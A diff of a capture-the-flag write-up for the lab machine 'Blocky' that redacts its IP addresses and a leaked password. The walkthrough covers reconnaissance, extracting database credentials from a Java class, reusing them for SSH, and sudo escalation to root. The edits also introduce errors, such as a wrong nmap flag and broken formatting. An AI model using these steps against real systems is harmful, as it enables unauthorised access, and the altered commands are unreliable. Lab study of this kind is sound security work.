@@ -4,7 +4,8 @@
 - **Name:** Blocky
 - **OS:** Linux (Ubuntu)
 - **Difficulty:** Easy
-- **IP:** 10.129.45.198
+- **IP:** X.X.X.X
+- **Attacker IP:** Y.Y.Y.Y
 
 ---
 
@@ -13,7 +14,7 @@
 ### Initial Nmap Scan
 
 ```bash
-nmap -sC -sV -oA blocky 10.129.45.198
+nmap -sC -sv -oA blocky X.X.X.X
 ```
 
 **Results:**
@@ -28,7 +29,7 @@ PORT      STATE  SERVICE VERSION
 ### Add Hosts Entry
 
 ```bash
-echo "10.129.45.198 blocky.htb" | sudo tee -a /etc/hosts
+echo "X.X.X.X blocky.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -42,9 +43,11 @@ wpscan --url http://blocky.htb --enumerate
 ```
 
 **Key Findings:**
+
 - WordPress 4.8 (outdated)
 - Theme: twentyseventeen 1.3
-- User identified: **notch**
+- 
+User identified: **notch**
 - XML-RPC enabled
 - Upload directory has listing enabled
 
@@ -104,12 +107,12 @@ strings BlockyCore.class
 **Key finding - MySQL credentials:**
 
 ```java
-String url = "jdbc:mysql://localhost:3306/blocky?user=root&password=8YsqfCTnvxAUeduzjNSXe22";
+String url = "jdbc:mysql://localhost:3306/blocky?user=root&password=PASSWORD_REDACTED";
 ```
 
 **Credentials found:**
 - **Database user:** root
-- **Database password:** 8YsqfCTnvxAUeduzjNSXe22
+- **Database password:** PASSWORD_REDACTED
 
 ---
 
@@ -120,20 +123,20 @@ String url = "jdbc:mysql://localhost:3306/blocky?user=root&password=8YsqfCTnvxAU
 The MySQL root password is likely reused for SSH.
 
 ```bash
-ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa notch@10.129.45.198
+ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa notch@X.X.X.X
 ```
 
-**Password:** `8YsqfCTnvxAUeduzjNSXe22`
+**Password:** `PASSWORD_REDACTED`
 
 **Success!** Logged in as `notch`
 
 ### Alternative - Try Other Users
 
 ```bash#Try root
-ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.129.45.198
+ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa root@X.X.X.X
 ```
 
-**Password:** `8YsqfCTnvxAUeduzjNSXe22`
+**Password:** `PASSWORD_REDACTED`
 
 ---
 
@@ -155,7 +158,7 @@ User notch may run the following commands on Blocky:
 
 ```bash
 sudo su
-# Enter password: 8YsqfCTnvxAUeduzjNSXe22
+# Enter password: PASSWORD_REDACTED
 ```
 
 **Success!** Now root!
